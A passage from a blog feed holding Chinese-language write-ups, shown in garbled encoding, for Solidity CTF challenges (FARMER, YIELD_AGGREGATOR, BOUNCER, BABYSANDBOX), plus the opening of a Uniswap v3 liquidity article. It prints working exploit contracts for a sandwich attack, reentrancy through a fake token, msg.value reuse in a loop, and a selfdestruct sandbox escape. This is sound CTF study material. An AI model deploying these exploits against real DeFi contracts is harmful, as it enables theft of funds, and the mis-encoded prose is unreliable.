<br></code></pre></td></tr></table></figure><p>peekYieldå…¶å®è´¨æ˜¯Uniswapä¸­ï¼ŒCOMP-&gt;WETH-&gt;DAIçš„è¿ç»­ä¸¤æ¬¡swapã€‚æˆ‘ä»¬ç›´åˆ°SWAPçš„ä»·æ ¼æ›²çº¿æ˜¯åœ¨ x*y=k çš„æ›²çº¿ä¸Šç§»åŠ¨ï¼Œæ•…ä¸€ä¸ªç®€å•çš„æ€è·¯æ˜¯åœ¨è®©æ›²çº¿ä¸Šçš„ç‚¹å…ˆå‘ä¸‹ç§»åŠ¨ï¼Œå†è¿›è¡ŒCOMP-&gt;WETH-&gt;DAIçš„äº¤æ¢ï¼Œæ­¤æ—¶èƒ½å¤Ÿæ¢åˆ°çš„DAIçš„æ•°é‡å°±ä¼šæ¯”peekYieldçš„æ•°é‡å°‘ã€‚å³<a href="https://medium.com/coinmonks/defi-sandwich-attack-explain-776f6f43b2fd">ä¸‰æ˜æ²»æ”»å‡»</a> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function peekYield() public view returns (uint256) &#123;<br>    uint256 claimableAmount = IComptroller(comptroller).claimableComp();<br><br>    address[] memory path = new address[](3);<br>    path[0] = address(COMP);<br>    path[1] = address(WETH);<br>    path[2] = address(dai);<br><br>    uint256[] memory amounts = router.getAmountsOut(claimableAmount, path);<br>    return amounts[2];<br>&#125;<br></code></pre></td></tr></table></figure><p>recycleä¹Ÿæ˜¯è¿›è¡ŒCOMP-&gt;WETH-&gt;DAIçš„äº¤æ¢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function recycle() public returns (uint256) &#123;<br>    address[] memory path = new address[](3);<br>    path[0] = address(COMP);<br>    path[1] = address(WETH);<br>    path[2] = address(dai);<br><br>    uint256 bal = COMP.balanceOf(address(this));<br>    COMP.approve(address(router), bal);<br><br>    uint256[] memory amts = router.swapExactTokensForTokens(<br>        bal,<br>        0,<br>        path,<br>        address(this),<br>        block.timestamp + 1800<br>    );<br><br>    return amts[2];<br>&#125;<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥æœ‰ä»¥ä¸‹æ”»å‡»åˆçº¦</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.8.0;<br><br>import &quot;./Setup.sol&quot;;<br><br>contract farmerExploit &#123;<br>    ERC20Like public constant dai = ERC20Like(0x6B175474E89094C44Da98b954EedeAC495271d0F);<br>    UniRouter public constant router = UniRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);<br>    WETH9 public constant WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);<br><br>    ERC20Like public constant COMP = ERC20Like(0xc00e94Cb662C3520282E6f5717214004A7f26888);<br><br>    CompDaiFarmer public farmer;<br>    farmerSetup setup;<br><br>    constructor(farmerSetup _setup) payable &#123;<br>        // å°†ETHå­˜å…¥WETHï¼Œæ¢æˆWETH<br>        WETH.deposit&#123;value: msg.value&#125;();<br>        setup = _setup;<br>        farmer = setup.farmer();<br>        WETH.approve(address(farmer), type(uint256).max);<br>        WETH.approve(address(router), type(uint256).max);<br><br>        COMP.approve(address(farmer), type(uint256).max);<br>        COMP.approve(address(router), type(uint256).max);<br><br>        // å°† WETH é€šè¿‡ uniswap äº¤æ¢æˆdai =&gt; ä»è€Œå‘ä¸‹ç§»åŠ¨ WETH -&gt; DAI æ›²çº¿ç‚¹<br>        // äº‹å®ä¸Šäº¤æ˜“ Comp -&gt; WETH å¯¹æˆ‘ä»¬æ¥è¯´ä¼šæ›´æœ‰åˆ©å¯å›¾<br>        // ä½†æˆ‘ä»¬æ²¡æœ‰ä»»ä½• Compï¼Œæ‰€ä»¥é€‰æ‹© WETH -&gt; DAI<br>        address[] memory path = new address[](2);<br>        path[0] = address(WETH);<br>        path[1] = address(dai);<br><br>        uint256 bal = WETH.balanceOf(address(this));<br><br>        router.swapExactTokensForTokens(<br>            bal, //amountIn<br>            0, //amountOutMinï¼Œæ¼æ´ç‚¹åœ¨è¿™é‡Œï¼Œæ£€æŸ¥Swapæœ€åå¾—åˆ°çš„Tokenæ•°é‡å’Œæä¾›çš„amountOutMinå€¼çš„å¤§å°å…³ç³»<br>            path, //path<br>            address(this), //to<br>            block.timestamp //deadline<br>        );<br>        //ç´¢èµ”COMP,ä½¿ faucet çš„compæ•°é‡ä¸º0<br>        farmer.claim();<br>        //å°†COMPäº¤æ¢å¾—åˆ°dai,ä½¿ farm çš„COMPçš„æ•°é‡ä¸º0ï¼Œä¸”daiçš„æ•°é‡å°‘äºexpected<br>        farmer.recycle();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="YIELD-AGGREGATOR"><a href="#YIELD-AGGREGATOR" class="headerlink" title="YIELD_AGGREGATOR"></a>YIELD_AGGREGATOR</h2><p>ç›®æ ‡æ˜¯wethä½™é¢æ¸…é›¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function isSolved() public view returns (bool) &#123;<br>    return weth.balanceOf(address(aggregator)) == 0 &amp;&amp;<br>        weth.balanceOf(address(bank)) == 0;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="è§£æ³•ä¸€"><a href="#è§£æ³•ä¸€" class="headerlink" title="è§£æ³•ä¸€"></a>è§£æ³•ä¸€</h3><p>è¿™é‡Œçš„ <code>transferFrom</code> æ˜¯ä¸€ä¸ªå¤–éƒ¨è°ƒç”¨ï¼Œå¯ä»¥åˆ©ç”¨å¤–éƒ¨è°ƒç”¨å®ç°é‡å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function deposit(Protocol protocol, address[] memory tokens, uint256[] memory amounts) public &#123;<br>    uint256 balanceBefore = protocol.balanceUnderlying();<br>    for (uint256 i= 0; i &lt; tokens.length; i++) &#123;<br>        address token = tokens[i];<br>        uint256 amount = amounts[i];<br><br>        ERC20Like(token).transferFrom(msg.sender, address(this), amount);<br>        ERC20Like(token).approve(address(protocol), 0);<br>        ERC20Like(token).approve(address(protocol), amount);<br>        // reset approval for failed mints<br>        try protocol.mint(amount) &#123; &#125; catch &#123;<br>            ERC20Like(token).approve(address(protocol), 0);<br>        &#125;<br>    &#125;<br>    uint256 balanceAfter = protocol.balanceUnderlying();<br>    uint256 diff = balanceAfter - balanceBefore;<br>    poolTokens[msg.sender] += diff;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><code>deposit</code> ä¸­ä¸ä¼šæ£€æŸ¥è¾“å…¥çš„protocolå’Œtokensï¼Œå¹¶ä¸”ä½¿ç”¨balanceBeforeå’ŒbalanceAfterè¿™ç§å¿«ç…§æ¨¡å¼æ¥è®¡ç®—ç”¨æˆ·å­˜å…¥é‡‘é¢</p><p>åˆ©ç”¨transferFromé‡å…¥æœ‰ä»¥ä¸‹æµç¨‹</p><blockquote><ul><li>deposit fakeTokenï¼Œæ•°ç›®ä¸é™</li><li>balanceUnderlying = 50 ï¼ˆsetupåçš„åˆå§‹å€¼ï¼‰</li><li>fakeToken.transferFrom ï¼ˆå·²é‡å†™ï¼‰<ul><li>deposit weth 50</li><li>weth.transferFrom 50</li><li>balanceUnderlying = 100</li><li>diff = 50</li><li>poolTokens += diff ï¼ˆç¬¬ä¸€æ¬¡ï¼‰</li></ul></li><li>balanceUnderlying = 100</li><li>diff = 50</li><li>poolTokens += diff ï¼ˆç¬¬äºŒæ¬¡ï¼‰</li></ul></blockquote><p>demo</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract yieldExploit &#123;<br>    yieldSetup setup;<br>    YieldAggregator aggregator;<br>    WETH92 constant weth = WETH92(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);<br>    Protocol protocol;<br>    <br>    constructor(yieldSetup _setup) payable &#123;<br>        require(msg.value == 50 ether);<br>        setup = _setup;<br>        aggregator = setup.aggregator();<br>        protocol = Protocol(address(setup.bank()));<br>        // fund our wallet<br>        weth.deposit&#123;value: msg.value&#125;();<br>        weth.approve(address(aggregator), type(uint256).max);<br>        weth.approve(address(protocol), type(uint256).max);<br>    &#125;<br><br>    function attack() public &#123;<br>        address[] memory _tokens = new address[](1);<br>        _tokens[0] = address(this);<br><br>        uint256[] memory _amounts = new uint256[](1);<br>        _amounts[0] = 100;<br>        aggregator.deposit(protocol, _tokens, _amounts);<br><br>        _tokens[0] = address(weth);<br>        _amounts[0] = 100 ether;<br>        aggregator.withdraw(protocol, _tokens, _amounts);<br>    &#125;<br>    <br>    function transferFrom(<br>        address src,<br>        address dst,<br>        uint256 qty<br>    ) external returns (bool) &#123;<br>        address[] memory _tokens = new address[](1);<br>        _tokens[0] = address(weth);<br><br>        uint256[] memory _amounts = new uint256[](1);<br>        _amounts[0] = 50 ether;<br>        aggregator.deposit(protocol, _tokens, _amounts);<br>        return true;<br>    &#125;<br><br>    function approve(<br>        address dst,<br>        uint256 qty<br>    ) external returns (bool) &#123;<br>        return true;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="è§£æ³•äºŒ"><a href="#è§£æ³•äºŒ" class="headerlink" title="è§£æ³•äºŒ"></a>è§£æ³•äºŒ</h3><p>è‡ªå·±ç”Ÿæˆä¸€ä¸ªæ–°çš„bankï¼Œdeposit weth 50ï¼Œå¢åŠ poolTokens[attackContract]çš„å€¼ï¼Œå†withdraw åŸbank 50</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract ExploitYieldAggregator &#123;<br>    WETH92 constant weth = WETH92(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2); // mainnet<br><br>    constructor(address _bank, address _aggregator) payable &#123;<br>        require(msg.value == 50 ether);<br><br>        weth.deposit&#123;value: msg.value&#125;();<br>        weth.approve(_aggregator, type(uint256).max);<br><br>        MiniBank exploitBank = new MiniBank();<br><br>        address[] memory _tokens = new address[](1);<br>        _tokens[0] = address(weth);<br><br>        uint256[] memory _amounts = new uint256[](1);<br>        _amounts[0] = 50 ether;<br><br>        YieldAggregator aggregator = YieldAggregator(_aggregator);<br>        //æ­¤å¤„çš„_amountså¿…é¡»å¤§äºç­‰äº50ï¼Œå¦åˆ™withdrawæ—¶poolTokens[attackContract]ä¼šä¸è¶³<br>        aggregator.deposit(Protocol(address(exploitBank)), _tokens, _amounts);<br><br>        _amounts[0] = 50 ether;<br>        aggregator.withdraw(Protocol(_bank), _tokens, _amounts);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="BOUNCER"><a href="#BOUNCER" class="headerlink" title="BOUNCER"></a>BOUNCER</h2><p>è¦æ±‚æ˜¯æ¸…ç©ºåˆçº¦bouncerçš„ä½™é¢ï¼Œåˆå§‹çŠ¶æ€ä¸‹bouncerä½™é¢ä¸º50+2 ETH</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function isSolved() public view returns (bool) &#123;<br>    return address(bouncer).balance == 0;<br>&#125;<br></code></pre></td></tr></table></figure><p>åªæœ‰payoutå…·æœ‰transferåŠŸèƒ½</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function payout(ERC20Like token, address to, uint256 amount) private &#123;<br>    if (address(token) == ETH) &#123;<br>        payable(to).transfer(amount);<br>    &#125; else &#123;<br>        require(token.transfer(to, amount), &quot;err/not enough tokens&quot;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>payoutè¢«redeemè°ƒç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function redeem(ERC20Like token, uint256 amount) public &#123;<br>    tokens[msg.sender][address(token)] -= amount;<br>    payout(token, msg.sender, amount);<br>&#125;<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥é¦–å…ˆè¦ä½¿ <code>tokens[msg.sender][address(token)]</code> è¢«å¢åŠ </p><p>convertå¯ä»¥è¾¾æˆéœ€æ±‚ï¼Œä½†æ˜¯ä¼šåœ¨proofOfOwnershipä¸­æ£€æŸ¥msg.value == amount</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">function</span> convert(address who, uint256 id) payable public &#123;<br>    <span class="hljs-meta">Entry</span> memory <span class="hljs-meta">entry</span> = entries[who][id]<span class="hljs-comment">;</span><br>    <span class="hljs-meta">require</span>(block.timestamp != <span class="hljs-meta">entry</span>.timestamp, <span class="hljs-string">&quot;err/wait after entering&quot;</span>)<span class="hljs-comment">;</span><br>    <span class="hljs-meta">if</span> (address(<span class="hljs-meta">entry</span>.token) != ETH) &#123;<br>        <span class="hljs-meta">require</span>(<span class="hljs-meta">entry</span>.token.allowance(who, address(this)) == type(uint256).max, <span class="hljs-string">&quot;err/must give full approval&quot;</span>)<span class="hljs-comment">;</span><br>    &#125;<br>    <span class="hljs-meta">require</span>(msg.sender == who <span class="hljs-title">||</span> msg.sender == delegates[who])<span class="hljs-comment">;</span><br>    proofOfOwnership(<span class="hljs-meta">entry</span>.token, who, <span class="hljs-meta">entry</span>.amount)<span class="hljs-comment">;</span><br>    tokens[who][address(<span class="hljs-meta">entry</span>.token)] += <span class="hljs-meta">entry</span>.amount<span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥é€‰æ‹©åˆ©ç”¨convertManyï¼Œæ”¯ä»˜1ä»½valueè€Œä½¿ <code>tokens[who][address(entry.token)]</code> nå€çš„å¢åŠ </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function convertMany(address who, uint256[] memory ids) payable public &#123;<br>    for (uint256 i = 0; i &lt; ids.length; i++) &#123;<br>        convert(who, ids[i]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>demo</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.8.0;<br><br>import &quot;./Setup.sol&quot;;<br><br>contract bouncerExploit &#123;<br><br>    address constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;<br>    uint256 public constant entryFee = 1 ether;<br>    Bouncer bouncer;<br><br>    function attack1(address _bouncer) public payable &#123;<br>        bouncer = Bouncer(_bouncer);<br>        require(msg.value == entryFee);<br><br>        uint256 amount = entryFee + address(bouncer).balance;<br>        bouncer.enter&#123;value: entryFee&#125;(ETH, amount);<br>        //æ­¤æ—¶address(bouncer).balance=52+1<br>    &#125;<br><br>    function attack2() public payable &#123;<br>    //amount=53<br>        uint256 amount = address(bouncer).balance;<br>        require(msg.value == amount);<br><br>        uint256[] memory ids = new uint256[](2);<br>        ids[0] = 0;<br>        ids[1] = 0;<br><br>        bouncer.convertMany&#123;value: amount&#125;(address(this), ids);<br>        //åˆ©ç”¨convertManyï¼Œä½¿<br>        //address(bouncer).balance=106<br>        //tokens[address(exploit)][address(ETH)]=106<br>        bouncer.redeem(ERC20Like(ETH), address(bouncer).balance);<br>    &#125;<br><br>    receive() external payable &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="BABYSANDBOX"><a href="#BABYSANDBOX" class="headerlink" title="BABYSANDBOX"></a>BABYSANDBOX</h2><p>è¦æ±‚éƒ¨ç½²çš„BabySandboxåˆçº¦çš„ä»£ç å¤§å°å˜ä¸º 0 ï¼Œå³é”€æ¯ä»–</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function isSolved() public view returns (bool) &#123;<br>    uint size;<br>    assembly &#123;<br>        size := extcodesize(sload(sandbox.slot))<br>    &#125;<br>    return size == 0;<br>&#125;<br></code></pre></td></tr></table></figure><p><a href="https://www.evm.codes/#fa">staticcall</a> æ„æ€æ˜¯ç­‰åŒäº<em>CALL</em>ï¼Œé™¤äº†å®ƒä¸å…è®¸ä»»ä½•çŠ¶æ€ä¿®æ”¹æŒ‡ä»¤ã€‚å› æ­¤ <em>SELFDESTRUCT</em> ä¸å…è®¸åœ¨ <em>staticcall</em> æœŸé—´ä½¿ç”¨</p><p>BabySandbox.run()çš„å†…éƒ¨é€»è¾‘</p><ul><li><p>é¦–å…ˆä¼šåˆ¤æ–­<code>msg.sender == address(this)</code>ï¼Œå³åˆ¤æ–­æ˜¯å¦ä¸ºåˆçº¦è‡ªèº«è°ƒç”¨ã€‚ç”±äºæˆ‘ä»¬å°†ä¼šå¤–éƒ¨è°ƒç”¨è¯¥åˆçº¦ï¼Œæ•…æ­¤æ—¶çš„<code>msg.sender</code>æ˜¯codeåˆçº¦åœ°å€ï¼Œåˆ¤æ–­ä¸ºå¦ã€‚</p></li><li><p>ç„¶åè¿›å…¥<code>staticcall(address(this))</code>éƒ¨åˆ†ï¼Œå®ƒé‡è¿›å…¥è‡ªå·±çš„åˆçº¦å†…ï¼Œå†æ¬¡è°ƒç”¨<code>babysandbox.run(code)</code>æ–¹æ³•ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">if iszero(staticcall(0x4000, address(), 0, calldatasize(), 0, 0)) &#123;<br>    revert(0x00, 0x00)<br>&#125;<br></code></pre></td></tr></table></figure><p>æ­¤æ—¶éœ€æ³¨æ„ï¼Œç”±äºæ˜¯é‡è¿›å…¥ï¼Œæ•…æ­¤æ—¶çš„<code>msg.sender</code>ä¸<code>address(this)</code>ç›¸ç­‰ã€‚æ•…ç»è¿‡åˆ¤å®šï¼Œä¼šè¿›å…¥åˆ°<code>delegatecall(code)</code>çš„é€»è¾‘ä¸­ã€‚</p><ul><li><p>åœ¨<code>delegatecall(code)</code>é€»è¾‘ä¸­ï¼Œå®é™…ä¸Šæ˜¯è°ƒç”¨å¤–éƒ¨åˆçº¦codeçš„<code>fallback()</code>æ–¹æ³•ï¼Œæ³¨æ„æ­¤æ—¶ä¸º<code>staticcall</code>çš„è°ƒç”¨ç¯å¢ƒï¼Œæ•…æ­¤æ—¶åº”è¯¥è®©å…¶ç›´æ¥è¿”å›<code>success</code>å³å¯ã€‚</p></li><li><p>å¹¶ä¸”æ­¤æ—¶åœ¨staticcallç¯å¢ƒä¸­ï¼Œä¸å…è®¸ä¿®æ”¹çŠ¶æ€</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs solidity">switch delegatecall(gas(), code, 0x00, 0x00, 0x00, 0x00)<br></code></pre></td></tr></table></figure></li></ul></li><li><p><code>staticcall(address(this))</code>é€šè¿‡åï¼Œä¼šè¿›å…¥<code>call(address(this))</code>è°ƒç”¨ï¼ŒåŒæ ·çš„å‚æ•°ï¼ŒåŒæ ·çš„é€»è¾‘è¿‡ç¨‹ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs solidity">switch call(0x4000, address(), 0, 0, calldatasize(), 0, 0)<br></code></pre></td></tr></table></figure><ul><li><p>é‡è¿›å…¥è‡ªå·±çš„åˆçº¦å†…ï¼Œå†æ¬¡è°ƒç”¨<code>babysandbox.run(code)</code>æ–¹æ³•ï¼Œè¿›å…¥åˆ°<code>delegatecall(code)</code>çš„é€»è¾‘ä¸­</p></li><li><p>åœ¨<code>delegatecall(code)</code>é€»è¾‘ä¸­ï¼Œè°ƒç”¨å¤–éƒ¨åˆçº¦codeçš„<code>fallback()</code>æ–¹æ³•</p><p>å› æ­¤æ­¤æ—¶éœ€è¦åœ¨<code>code.fallback()</code>å‡½æ•°ä¸­ï¼Œä¸ç›´æ¥è¿”å›ï¼Œè€Œæ˜¯æ‰§è¡Œ<code>selfdestruct(tx.origin)</code>æ¥é”€æ¯babysandboxåˆçº¦ã€‚</p><p>æ³¨æ„ï¼Œç”±äº<a href="https://learnblockchain.cn/article/4310#%E6%89%A7%E8%A1%8C%E4%B8%8A%E4%B8%8B%E6%96%87">delegatecall</a>ä¸ä¼šæ”¹å˜ä¸Šä¸‹æ–‡ï¼Œæ‰€ä»¥msg.senderå’Œtx.originéƒ½å¯ä»¥ä½¿ç”¨</p></li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs solidity">import &quot;./Setup.sol&quot;;<br><br>contract Child &#123;<br>    Child private immutable self = this;<br>    uint8 flag = 1;<br><br>    //è¯•å›¾ä¿®æ”¹çŠ¶æ€ï¼Œåˆ¤æ–­æ˜¯å¦åœ¨staticcallç¯å¢ƒä¸­<br>    function check() external &#123;<br>        flag += 1;<br>    &#125;<br><br>    fallback() external payable &#123;<br>        //å¦‚æœä¿®æ”¹çŠ¶æ€æˆåŠŸï¼Œåˆ™è¯´æ˜ä¸åœ¨staticcallç¯å¢ƒä¸­ï¼Œå¯ä»¥è¿›è¡Œselfdestruct<br>        try self.check() &#123;<br>            selfdestruct(tx.origin);<br>        &#125; catch &#123;&#125;<br>        //ç”±äºstaticcallç¯å¢ƒä¸­ä¸èƒ½ä¿®æ”¹çŠ¶æ€ï¼Œå› æ­¤ä»¥ä¸‹æ–¹æ³•ä¸èƒ½å®ç°<br>//        bool flag = false;<br>//        if(flag) &#123;<br>//            selfdestruct(tx.origin);<br>//        &#125;else&#123;<br>//            flag = true;<br>//        &#125;<br>    &#125;<br>&#125;<br><br>contract babySandboxExploit &#123;<br>    constructor(babySandboxSetup setup) &#123;<br>        setup.sandbox().run(address(new Child()));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>é¶åœºåˆ·é¢˜</tag>
      
      <tag>Etherum</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Uniswap Part â…¡ | æä¾›/ç§»é™¤æµåŠ¨æ€§</title>
    <link href="/2022/08/20/uniswap-v3-2/"/>
    <url>/2022/08/20/uniswap-v3-2/</url>
    
    <content type="html"><![CDATA[<h1 id="æä¾›æµåŠ¨æ€§"><a href="#æä¾›æµåŠ¨æ€§" class="headerlink" title="æä¾›æµåŠ¨æ€§"></a>æä¾›æµåŠ¨æ€§</h1><p>åœ¨åˆçº¦å†…ï¼Œv3 ä¼šä¿å­˜æ‰€æœ‰ç”¨æˆ·çš„æµåŠ¨æ€§ï¼Œä»£ç å†…ç§°ä½œ <code>Position</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sequence">User-&gt;NonfungiblePositionManager:mint<br>NonfungiblePositionManager-&gt;NonfungiblePositionManager:addLiquidity<br>NonfungiblePositionManager-&gt;UniswapV3Pool:mint<br>UniswapV3Pool-&gt;UniswapV3Pool:_modifyPosition<br>UniswapV3Pool-&gt;UniswapV3Pool:_updatePosition<br></code></pre></td></tr></table></figure><p><code>NonfungiblePositionManager</code>çš„mintå‡½æ•°å®ç°åˆå§‹çš„æµåŠ¨æ€§çš„æ·»åŠ ã€‚<code>increaseLiquidity</code>å‡½æ•°å®ç°äº†æµåŠ¨æ€§çš„å¢åŠ 